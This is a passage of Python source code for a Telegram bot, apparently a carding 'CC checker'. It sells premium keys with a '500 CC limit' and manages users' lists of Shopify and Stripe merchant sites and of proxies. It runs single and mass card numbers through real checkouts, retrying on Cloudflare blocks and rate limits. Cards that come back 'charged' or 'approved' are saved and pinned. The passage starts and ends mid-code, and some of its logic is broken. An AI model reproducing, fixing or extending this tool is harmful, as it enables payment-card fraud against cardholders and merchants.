        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙜𝙧𝙖𝙣𝙩𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪m 𝙖𝙘𝙘𝙚𝙨𝙨!")
        try: await client.send_message(user_id, f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
        except: pass
    except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿 𝙤𝙧 𝙙𝙖𝙮𝙨!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern=r'/deletesites'))
async def delete_all_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    try:
        sites = await load_json(SITE_FILE)

        if str(event.sender_id) not in sites or len(sites[str(event.sender_id)]) == 0:
            return await event.reply("❌ You don't have any saved sites.")

        total = len(sites[str(event.sender_id)])
        del sites[str(event.sender_id)]

        await save_json(SITE_FILE, sites)

        await event.reply(
            f"✅ Successfully deleted all saved sites.\n\n"
            f"🗑 Deleted: {total} site(s)"
        )

    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s")
        await asyncio.sleep(e.seconds)

    except Exception as e:
        print(f"Error: {e}")
        
@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID: return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /key {amount} {days}")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10: return await event.reply("❌ 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 10 𝙠𝙚𝙮𝙨 𝙖𝙩 𝙤𝙣𝙘𝙚!")
        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])
        await event.reply(f"✅ 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 {amount} 𝙠𝙚𝙮(𝙨) f𝙤𝙧 {days} 𝙙𝙖𝙮(𝙨):\n\n{keys_text}")
    except ValueError: await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙧 𝙙𝙖𝙮s!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /redeem {key}")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        if key not in keys_data: return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮!")
        if keys_data[key]['used']: return await event.reply("❌ 𝙏𝙝𝙞𝙨 𝙠𝙚𝙮 𝙝𝙖𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙚𝙚𝙣 𝙪𝙨𝙚𝙙!")
        if await is_premium_user(event.sender_id): return await event.reply("❌ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")
        days = keys_data[key]['days']
        await add_premium_user(event.sender_id, days)
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)
        await event.reply(f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩: /add site.com site.com")
        txt_sites = extract_urls_from_text(add_text)
        if not txt_sites: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added_sites = []
        already_exists = []
        for site in txt_sites:
            if site in user_sites: already_exists.append(site)
            else:
                user_sites.append(site)
                added_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if added_sites: response_parts.append("\n".join(f"✅ 𝙎𝙞𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝘼𝙙𝙙𝙚𝙙: {s}" for s in added_sites))
        if already_exists: response_parts.append("\n".join(f"⚠️ 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨: {s}" for s in already_exists))
        if response_parts: await event.reply("\n\n".join(response_parts))
        else: await event.reply("❌ 𝙉𝙤 𝙣𝙚𝙬 𝙨𝙞𝙩𝙚𝙨 𝙩𝙤 𝙖𝙙𝙙!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rm site.com")
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove: return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        removed_sites = []
        not_found_sites = []
        for site in sites_to_remove:
            if site in user_sites:
                user_sites.remove(site)
                removed_sites.append(site)
            else: not_found_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if removed_sites: response_parts.append("\n".join(f"✅ 𝙍𝙚𝙢𝙤𝙫𝙚𝙙: {s}" for s in removed_sites))
        if not_found_sites: response_parts.append("\n".join(f"❌ 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙: {s}" for s in not_found_sites))
        if response_parts: await event.reply("\n\n".join(response_parts))
        else: await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙬𝙚𝙧𝙚 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy(event):
    if event.is_group:
        return await event.reply("🔒 Private chat only!")
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) != 2:
            return await event.reply("Format: `/addpxy ip:port:username:password`")
        proxy_str = parts[1].strip()
        proxy_data = parse_proxy_format(proxy_str)
        if not proxy_data:
            return await event.reply("❌ Invalid proxy format!")
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        if len(user_proxies) >= 2000:
            return await event.reply("❌ Limit 2000 reached. Use /rmpxy")
        for existing in user_proxies:
            if existing['proxy_url'] == proxy_data['proxy_url']:
                return await event.reply("⚠️ Already added!")
        
        loading = await event.reply("🔄 Testing proxy...")
        is_working, result = await test_proxy(proxy_data['proxy_url'])
        
        if not is_working:
            await loading.edit(f"❌ Dead: {result}")
            return
        
        user_proxies.append(proxy_data)
        proxies[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies)
        await loading.edit(f"✅ Added!\nTotal: {len(user_proxies)}/2000")
        
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"Error: {e}")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]setpr?oxy$'))
async def set_proxy_bulk(event):
    if event.is_group:
        return await event.reply("🔒 Private chat only!")
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    if not event.reply_to_msg_id:
        return await event.reply("Reply to proxies.txt with /setproxy")
  
    replied = await event.get_reply_message()
    if not replied.document:
        return await event.reply("Reply to .txt file!")

    file_path = await replied.download_media()
    try:
        async with aiofiles.open(file_path, "r", encoding="utf-8") as f:
            content = await f.read()
        os.remove(file_path)
      
        proxy_lines = [line.strip() for line in content.splitlines() if line.strip()]
        if not proxy_lines:
            return await event.reply("No proxies found.")
      
        loading = await event.reply("🔄 Testing proxies... (0 added | 0 dead)")
        
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        
        added = 0
        dead_count = 0
        total_tested = 0
        max_limit = 2000
        
        async def test_single(p_str):
            nonlocal added, dead_count
            proxy_data = parse_proxy_format(p_str)
            if not proxy_data:
                return False
            if any(ex['proxy_url'] == proxy_data['proxy_url'] for ex in user_proxies):
                return False
            
            is_working, result = await test_proxy(proxy_data['proxy_url'])
            if is_working:
                user_proxies.append(proxy_data)
                added += 1
                return True
            dead_count += 1
            return False

        batch_size = 50
        for i in range(0, len(proxy_lines), batch_size):
            if len(user_proxies) >= max_limit:
                break
                
            batch = proxy_lines[i:i+batch_size]
            tasks = [test_single(p) for p in batch]
            await asyncio.gather(*tasks)
            
            total_tested += len(batch)
            
            await loading.edit(
                f"🔄 Testing proxies...\n"
                f"✅ Added: {added}\n"
                f"❌ Dead: {dead_count}\n"
                f"📊 Progress: {total_tested}/{min(len(proxy_lines), max_limit)}"
            )
            await asyncio.sleep(1.1)

        proxies[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies)
      
        await loading.edit(f"""🎉 Bulk Process Complete!

✅ Working Added: {added}
❌ Dead/Offline Skipped: {dead_count}
📊 Final Total: {len(user_proxies)}/{max_limit}""")

    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"Error: {e}")
        if 'loading' in locals():
            await loading.edit("❌ Error occurred during processing.")


@client.on(events.NewMessage(pattern=r'/addsitetxt'))
async def add_sites_bulk_txt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not event.reply_to_msg_id:
        return await event.reply("Reply to sites.txt with /addsitetxt")
    reply = await event.get_reply_message()
    if not reply.document:
        return await event.reply("Reply to .txt file.")
    try:
        file_path = await reply.download_media()
        async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            text = await f.read()
        os.remove(file_path)
        
        txt_sites = extract_urls_from_text(text)
        if not txt_sites:
            return await event.reply("❌ No valid urls/domains found!")
        
        loading = await event.reply("🔄 Adding sites... (0 added)")
        
        data = await load_json(SITE_FILE)
        user_sites = data.get(str(event.sender_id), [])
        added = 0
        
        batch_size = 100
        for i in range(0, len(txt_sites), batch_size):
            batch = txt_sites[i:i + batch_size]
            for site in batch:
                clean_site = site.replace("https://", "").replace("http://", "").strip().lower()
                if clean_site and clean_site not in user_sites:
                    user_sites.append(clean_site)
                    added += 1
            
            await loading.edit(f"🔄 Adding sites...\n✅ Added: {added}\n📊 Total: {len(user_sites)}")
            await asyncio.sleep(0.8)

        data[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, data)
        await loading.edit(f"""✅ Sites added successfully!

Added: {added}
Total sites: {len(user_sites)}""")

    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"Error: {e}")
        if 'loading' in locals():
            await loading.edit("❌ Error occurred while adding sites.")


# === NEW BULK COMMAND ===
@client.on(events.NewMessage(pattern=r'(?i)^[/.]setprxy$'))
async def set_proxy_bulk_new(event):
    if event.is_group:
        return await event.reply("🔒 Private chat only!")
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    if not event.reply_to_msg_id:
        return await event.reply("Reply to proxies.txt with /setprxy")
    
    replied = await event.get_reply_message()
    if not replied.document:
        return await event.reply("Reply to .txt file!")
    
    file_path = await replied.download_media()
    try:
        async with aiofiles.open(file_path, "r", encoding="utf-8") as f:
            content = await f.read()
        os.remove(file_path)
        
        proxy_lines = [line.strip() for line in content.splitlines() if line.strip()]
        if not proxy_lines:
            return await event.reply("No proxies found.")
        
        loading = await event.reply("🔄 Testing proxies... (0 added | 0 dead)")
        
        added = 0
        dead_count = 0
        total_tested = 0
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        max_limit = 2000
        
        async def test_single(p_str):
            nonlocal added, dead_count
            proxy_data = parse_proxy_format(p_str)
            if not proxy_data:
                return False
            if any(ex['proxy_url'] == proxy_data['proxy_url'] for ex in user_proxies):
                return False
            is_working, result = await test_proxy(proxy_data['proxy_url'])
            if is_working:
                user_proxies.append(proxy_data)
                added += 1
                return True
            dead_count += 1
            return False

        batch_size = 50
        for i in range(0, len(proxy_lines), batch_size):
            if len(user_proxies) >= max_limit:
                break
            batch = proxy_lines[i:i+batch_size]
            tasks = [test_single(p) for p in batch]
            await asyncio.gather(*tasks)
            total_tested += len(batch)
            
            await loading.edit(
                f"🔄 Testing proxies...\n"
                f"✅ Added: {added}\n"
                f"❌ Dead: {dead_count}\n"
                f"📊 Progress: {total_tested}/{min(len(proxy_lines), max_limit)}"
            )
            await asyncio.sleep(1.1)

        proxies[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies)
        
        await loading.edit(f"""🎉 Bulk Process Complete!

✅ Working Added: {added}
❌ Dead Skipped: {dead_count}
📊 Final Total: {len(user_proxies)}/{max_limit}""")
        
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"Error: {e}")
        if 'loading' in locals():
            await loading.edit("❌ Error occurred.")

@client.on(events.NewMessage(pattern='/rmpxy'))
async def remove_proxy(event):
    # This command works in private only
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        
        if not user_proxies:
            return await event.reply("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!")
        
        parts = event.raw_text.split(maxsplit=1)
        
        # If no argument, show usage
        if len(parts) == 1:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rmpxy <index>\n𝙊𝙧: /rmpxy all\n\n𝙐𝙨𝙚 /proxy 𝙩𝙤 𝙨𝙚𝙚 𝙞𝙣𝙙𝙚𝙭 𝙣𝙪𝙢𝙗𝙚𝙧𝙨")
        
        arg = parts[1].strip().lower()
        
        # Remove all proxies
        if arg == 'all':
            del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            return await event.reply(f"✅ 𝘼𝙡𝙡 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!")
        
        # Remove by index
        try:
            index = int(arg) - 1  # Convert to 0-based index
            
            if index < 0 or index >= len(user_proxies):
                return await event.reply(f"❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 (1-{len(user_proxies)})")
            
            removed_proxy = user_proxies.pop(index)
            
            if user_proxies:
                proxies[str(event.sender_id)] = user_proxies
            else:
                del proxies[str(event.sender_id)]
            
            await save_json(PROXY_FILE, proxies)
            
            await event.reply(f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!\n\n📍 {removed_proxy['ip']}:{removed_proxy['port']}\n📊 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜: {len(user_proxies)}")
            
        except ValueError:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙐𝙨𝙚: /rmpxy 1 𝙤𝙧 /rmpxy all")
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/proxy'))
async def view_proxy(event):
    # This command works in private only
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        user_proxies = await get_all_user_proxies(event.sender_id)
        
        if not user_proxies:
            return await event.reply("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!\n\n𝙐𝙨𝙚 /addpxy 𝙩𝙤 𝙖𝙙𝙙 𝙤𝙣𝙚.")
        
        # Build proxy list message
        proxy_list = f"📡 **𝙔𝙤𝙪𝙧 𝙋𝙧𝙤𝙭𝙞𝙚𝙨** ({len(user_proxies)}/2000)\n\n"
        
        for idx, proxy_data in enumerate(user_proxies, 1):
            proxy_type = proxy_data.get('type', 'http').upper()
            auth_info = ""
            if proxy_data.get('username'):
                auth_info = f" | 👤 {proxy_data['username']}"
            
            proxy_list += f"`{idx}.` 🔐 {proxy_type} | 📍 {proxy_data['ip']}:{proxy_data['port']}{auth_info}\n"
        
        proxy_list += f"\n**ℹ️ 𝙄𝙣𝙛𝙤:**\n• Bot uses random proxy for each check\n• Dead proxies are auto-removed\n• Supports HTTP, HTTPS, SOCKS4, SOCKS5\n• Use `/rmpxy <index>` to remove specific proxy\n• Use `/rmpxy all` to remove all proxies"
        
        await event.reply(proxy_list)
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]st'))
async def st(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/alonechacha")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!", buttons=buttons)
    asyncio.create_task(process_st_card(event, access_type))
@client.on(events.NewMessage(pattern='/sadd'))
async def sadd_stripe_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("Premium/Group me use kar.")
    
    site_text = event.raw_text[5:].strip()
    if not site_text:
        return await event.reply("Format: `/sadd example.com`")
    
    sites = extract_urls_from_text(site_text)
    added = 0
    for site in sites:
        if await add_stripe_site(event.sender_id, site):
            added += 1
    await event.reply(f"✅ {added} Stripe site(s) added successfully!")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("Group join kar le free use ke liye.")
    
    cards = extract_all_cards(event.raw_text if not event.reply_to_msg_id else (await event.get_reply_message()).text or "")
    if not cards:
        return await event.reply("No cards found.")
    asyncio.create_task(process_mst_cards(event, cards))

async def process_mst_cards(event, cards):
    msg = await event.reply(f"🍳 Checking {len(cards)} cards on Stripe...")
    for card in cards[:50]:  # safety limit
        res = await check_card_stripe(card, user_id=event.sender_id)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        
        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎" if res.get("Status") in ["Charged", "Approved_3DS"] else "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
        if "Charged" in status_header or "Approved" in status_header:
            await save_approved_card(card, res.get("Status"), res.get('Response'), "Stripe", res.get('Price'))
        
        result_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')}

```BIN: {brand} {bin_type}
Country: {country} {flag}```"""
        await event.reply(result_msg)
        await asyncio.sleep(1)
    await msg.edit("✅ Mass Stripe check completed.")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mstxt$'))
async def mstxt(event):
    # Same as mtxt but for stripe
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if not can_access or access_type == "banned":
        return await event.reply("Access denied.")
    
    if not event.reply_to_msg_id:
        return await event.reply("Reply to .txt file with /mstxt")
    
    replied = await event.get_reply_message()
    file_path = await replied.download_media()
    async with aiofiles.open(file_path, "r") as f:
        content = await f.read()
    os.remove(file_path)
    
    cards = extract_all_cards(content)
    if not cards:
        return await event.reply("No valid cards.")
    
    asyncio.create_task(process_mst_cards(event, cards))
        
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/alonechacha")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n`/addpxy ip:port:username:password`")

    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            card = extract_card(replied_msg.text)
    else:
        card = extract_card(event.raw_text)

    if not card:
        return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /sh 4893960085072590|06|26|779")

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: 
        return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨. /add se add karo")

    loading_msg = await event.reply("🍳")

    RETRY_TRIGGERS = [
        "merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom",
        "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error",
        "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json",
        "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout",
        "site requires login", "site not supported", "cart failed with status 503", "connection error",
        "failed to get session token", "payment method not available", "invalid_payment_method",
        "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>",
        "no valid payment method found", "processing_error", "Cart failed with status 422", 
        "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "GENERIC_ERROR", "is_from_rle" "site dead"
    ]

    attempts = 0
    max_attempts = 8
    res = None
    site_index = 0
    while attempts < max_attempts:
        if user_id not in ACTIVE_MTXT_PROCESSES:
            return
        attempts += 1
        res, site_index = await check_card_random_site(card, user_sites, event.sender_id)
        response_lower = str(res.get("Response", "")).lower()

        if any(trigger.lower() in response_lower for trigger in   RETRY_TRIGGERS) and attempts < max_attempts:
            await asyncio.sleep(0.5 + attempts * 0.2)
            continue

        break

    end_time = time.time()
    elapsed_time = round(end_time - (time.time() - 2), 2)  # approximate
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

    response_lower = str(res.get("Response", "")).lower()
    if any(x in response_lower for x in ["charged", "order placed", "order completed", "payment successful", "💎", "insufficient_funds"]):
        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
        await save_approved_card(card, "Charged", res.get('Response'), res.get('Gateway'), res.get('Price'))
    elif any(x in response_lower for x in ["otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "approved", "success"]):
        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
    else:
        status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

    msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝙞𝙘𝙚 ⇾ {res.get('Price')} 💸
𝗦𝗶𝙩𝗲 ⇾ {site_index}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝙣𝙠: {bank}
𝗖𝙤𝙪𝙣𝙩𝙧𝙮: {country} {flag}```

𝗧𝗼𝗼𝙺 {elapsed_time} 𝘀𝗲𝙘𝙤𝙣𝙙𝙨"""

    await loading_msg.delete()
    result_msg = await event.reply(msg)
    if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header or "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
        await pin_charged_message(event, result_msg)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
